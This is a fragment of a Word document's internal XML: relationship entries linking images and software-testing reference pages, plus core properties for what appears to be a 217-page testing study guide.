Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.jpeg"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.jpeg"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image43.png"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement7.png" TargetMode="External"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.jpeg"/><Relationship Id="rId174" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image67.png"/><Relationship Id="rId179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://lh4.ggpht.com/_dIl2j8iaPMg/SkdmBr8iOiI/AAAAAAAABBM/nVo1_yinzeg/s1600-h/image%5b12%5d.png" TargetMode="External"/><Relationship Id="rId195" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.geonames.org/maps/json-googlemaps-example.html" TargetMode="External"/><Relationship Id="rId209" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.geonames.org/cities?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;username=demo" TargetMode="External"/><Relationship Id="rId190" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://query.yahooapis.com/v1/public/yql?q=select%20item%20from%20weather.forecast%20where%20location=%22LEXX0003%22&amp;format=json&amp;u=c" TargetMode="External"/><Relationship Id="rId204" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/mobile-testing.html" TargetMode="External"/><Relationship Id="rId220" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image81.png"/><Relationship Id="rId225" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-2.jpg" TargetMode="External"/><Relationship Id="rId241" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId246" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId267" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image97.png"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.mysql.com/doc/refman/5.7/en/mysql.html" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.google.com/document/d/1rPW5DV82VJT6vtA1VDSrfxaCBuAduxW0zb1yfTh_VMk/edit?pli=1" TargetMode="External"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/cloud-based-mobile-testing.jpg" TargetMode="External"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image51.png"/><Relationship Id="rId262" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image94.png"/><Relationship Id="rId283" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/payment-gateway-testing-tutorial-with-sample-test-cases.html" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/technology/software-technology/difference-between-application-server-and-web-server/" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/software-testing.html" TargetMode="External"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.jpeg"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.jpeg"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.jpeg"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.jpeg"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement2.png" TargetMode="External"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://demo.guru99.com/V4" TargetMode="External"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/an-expert-view-on-test-estimation.html" TargetMode="External"/><Relationship Id="rId164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-6.jpg" TargetMode="External"/><Relationship Id="rId169" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image64.jpeg"/><Relationship Id="rId185" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://weather.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/payment-gateway-testing-tutorial-with-sample-test-cases.html" TargetMode="External"/><Relationship Id="rId180" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/><Relationship Id="rId210" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:my.request.1@yopmail.com" TargetMode="External"/><Relationship Id="rId215" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image76.png"/><Relationship Id="rId236" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-7.jpg" TargetMode="External"/><Relationship Id="rId257" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.cybercash.com/" TargetMode="External"/><Relationship Id="rId278" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/category/technology/protocols-formats/" TargetMode="External"/><Relationship Id="rId231" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-5.jpg" TargetMode="External"/><Relationship Id="rId252" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.intrusion.com/" TargetMode="External"/><Relationship Id="rId273" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://qatestlab.com/services/No-Documentation/ad-hoc-testing/" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image29.jpeg"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific3.png" TargetMode="External"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-1.jpg" TargetMode="External"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://lh4.ggpht.com/_dIl2j8iaPMg/SkdmAXb_3CI/AAAAAAAABA8/BKxBHSmo-Ag/s1600-h/image%5b5%5d.png" TargetMode="External"/><Relationship Id="rId196" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.geonames.org/citiesJSON?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;lang=de&amp;username=demo" TargetMode="External"/><Relationship Id="rId200" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.geonames.org/export/ws-overview.html" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Java_Servlet" TargetMode="External"/><Relationship Id="rId221" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image82.png"/><Relationship Id="rId242" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId263" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image95.png"/><Relationship Id="rId284" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.mysql.com/doc/refman/5.7/en/explain.html" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/how-precaution-becomes-cure-risk-analysis-and-solutions-in-test-management.html" TargetMode="External"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.jpeg"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn2.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/mobile-device-emulator-4.jpg" TargetMode="External"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.google.com/document/d/1PZQZKt7hqS417QjYRMppPnTwfj8V54XUA7nZUnYvumE/edit?usp=sharing" TargetMode="External"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.jpeg"/><Relationship Id="rId165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image62.jpeg"/><Relationship Id="rId186" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/mobile-testing.html" TargetMode="External"/><Relationship Id="rId211" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image72.png"/><Relationship Id="rId232" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image88.jpeg"/><Relationship Id="rId253" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rsasecurity.com/" TargetMode="External"/><Relationship Id="rId274" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/miscellaneous/difference-between-caste-system-and-class-system/" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.guru99.com/exploratory-testing.html" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/2013/04/cookie_array.png" TargetMode="External"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image44.png"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement8.png" TargetMode="External"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.jpeg"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.jpeg"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/><Relationship Id="rId197" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.geonames.org/cities?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;username=demo" TargetMode="External"/><Relationship Id="rId201" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.javatpoint.com/soap-vs-rest-web-services" TargetMode="External"/><Relationship Id="rId222" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image83.jpeg"/><Relationship Id="rId243" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx" TargetMode="External"/><Relationship Id="rId264" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.softwaretestingclass.com/what-is-difference-between-two-tier-and-three-tier-architecture/two-tier-architecture/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.jpeg"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/SQL_injection" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.jpeg"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/1-2015/012615_1111_Requirement3.png" TargetMode="External"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image31.jpeg"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.google.com/document/d/1rPW5DV82VJT6vtA1VDSrfxaCBuAduxW0zb1yfTh_VMk/edit?pli=1" TargetMode="External"/><Relationship Id="rId166" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-7.jpg" TargetMode="External"/><Relationship Id="rId187" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:my.request.1@yopmail.com" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId212" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.png"/><Relationship Id="rId233" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image89.png"/><Relationship Id="rId254" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.verisign.com/" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.differencebetween.net/technology/difference-between-ubuntu-and-linux/" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://whatis.techtarget.com/definition/ad-hoc-testing" TargetMode="External"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.guru99.com/images/3-2016/032816_1141_SSLCertific4.png" TargetMode="External"/><Relationship Id="rId275" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.demo.guru99.com/V4" TargetMode="External"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.jpeg"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/test-summary-report-2.jpg" TargetMode="External"/><Relationship Id="rId177" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://lh4.ggpht.com/_dIl2j8iaPMg/SkdmBDuUfRI/AAAAAAAABBE/ZGFXL7yj4lA/s1600-h/image%5b9%5d.png" TargetMode="External"/><Relationship Id="rId198" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://forum.geonames.org/gforum/posts/list/8.page" TargetMode="External"/><Relationship Id="rId202" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://searchsoa.techtarget.com/definition/URI" TargetMode="External"/><Relationship Id="rId223" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2016/06/Testing-ecommerce-websites-1.jpg" TargetMode="External"/><Relationship Id="rId244" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msdn.microsoft.com/en-us/library/ms978235.aspx"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31116</TotalTime>
  <Pages>217</Pages>
  <Words>46460</Words>
  <Characters>264825</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>2206</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deepak.chamoli</dc:creator>
  <cp:lastModifiedBy>Deepak Chamoli</cp:lastModifiedBy>
  <cp:revision>293</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2016-03-08T08:45:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-03-13T12:21:00Z</dcterms:modified>
</cp:coreProperties>
</file>